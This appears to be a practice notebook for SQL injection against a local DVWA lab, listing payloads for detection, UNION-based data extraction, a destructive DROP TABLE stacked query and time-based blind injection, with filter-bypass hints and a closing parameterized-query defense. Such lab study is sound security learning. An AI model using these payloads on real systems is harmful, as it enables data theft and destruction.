# SQL Injection Practice - DVWA Lab

**Date:** 2026-03-06
**Environment:** localhost:8080 (DVWA)
**Goal:** Apply principles from Art of Exploitation + OWASP guide

---

## Setup

```bash
# DVWA running
docker ps | grep dvwa
# dvwa: Up 51 minutes

# Login via curl
curl -c cookies.txt -b cookies.txt http://localhost:8080/login.php
# Extract user_token, submit login form
```

## SQL Injection Module

URL: http://localhost:8080/vulnerabilities/sqli/

Form parameter: `id`
Query structure (guessed): 
```sql
SELECT * FROM users WHERE id = '$id'
```

---

## Test Payloads

### Level 1: Basic Detection

| Payload | Expected Result | Principle |
|---------|-----------------|-----------|
| `1` | Normal result | Baseline |
| `1'` | SQL error | Quote breaks query |
| `1' OR '1'='1` | All users returned | Tautology injection |
| `1' OR 1=1--` | All users returned | Comment bypass |

### Level 2: Data Extraction

| Payload | Purpose |
|---------|---------|
| `1' UNION SELECT 1,2--` | Column count detection |
| `1' UNION SELECT user(),database()--` | Extract DB info |
| `1' UNION SELECT table_name,null FROM information_schema.tables--` | Enumerate tables |

### Level 3: Advanced

| Payload | Purpose |
|---------|---------|
| `1'; DROP TABLE users--` | Multi-statement (if allowed) |
| `1' AND SLEEP(5)--` | Time-based blind injection |

---

## Hacker Principles Applied

### 1. Literal Interpretation
The query is: `SELECT * FROM users WHERE id = '$id'`

When `$id = "1' OR '1'='1"`, the query becomes:
```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```

The database sees: "Return rows where id='1' OR where '1'='1'"
Since '1'='1' is always true, ALL rows are returned.

**Lesson:** The database doesn't know "OR '1'='1'" is suspicious. It just evaluates the expression.

### 2. Edge Cases
- What if id is empty? `'' OR '1'='1'`
- What if id is numeric? `1 OR 1=1`
- What if there's filtering? Try case variations: `oR`, `Or`, `oR`

### 3. Control Flow
SQL injection hijacks the query's control flow:
- Normal: Query → specific user → display
- Injected: Query → all users → display

We're redirecting the data flow by manipulating the WHERE clause.

### 4. Environmental Exploitation
The application provides:
- Form input (user-controlled)
- Database connection (already authenticated)
- Error messages (information leakage)

We use what's already there. No need to break authentication - we're already logged in.

---

## Practice Results

*(To be filled with actual test results)*

---

## AGI Application

### Pattern Recognition
When Meeseeks sees user input going into a query:
1. **ALWAYS** assume injection is possible
2. Test with quote character first
3. If error → vulnerable
4. If filtered → try bypasses

### Defense Pattern
```python
# VULNERABLE
query = f"SELECT * FROM users WHERE id = '{user_input}'"

# SAFE
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_input,))
```

The parameterized version separates DATA from CODE. The database knows the difference.

### Concrete Trigger
```python
if task_involves("user input") and task_involves("database"):
    TRIGGER: "Check for SQL injection vulnerability"
    CHECK: "Is input parameterized or interpolated?"
```

---

*Learning by doing*
*Applying hacker principles*
*2026-03-06*
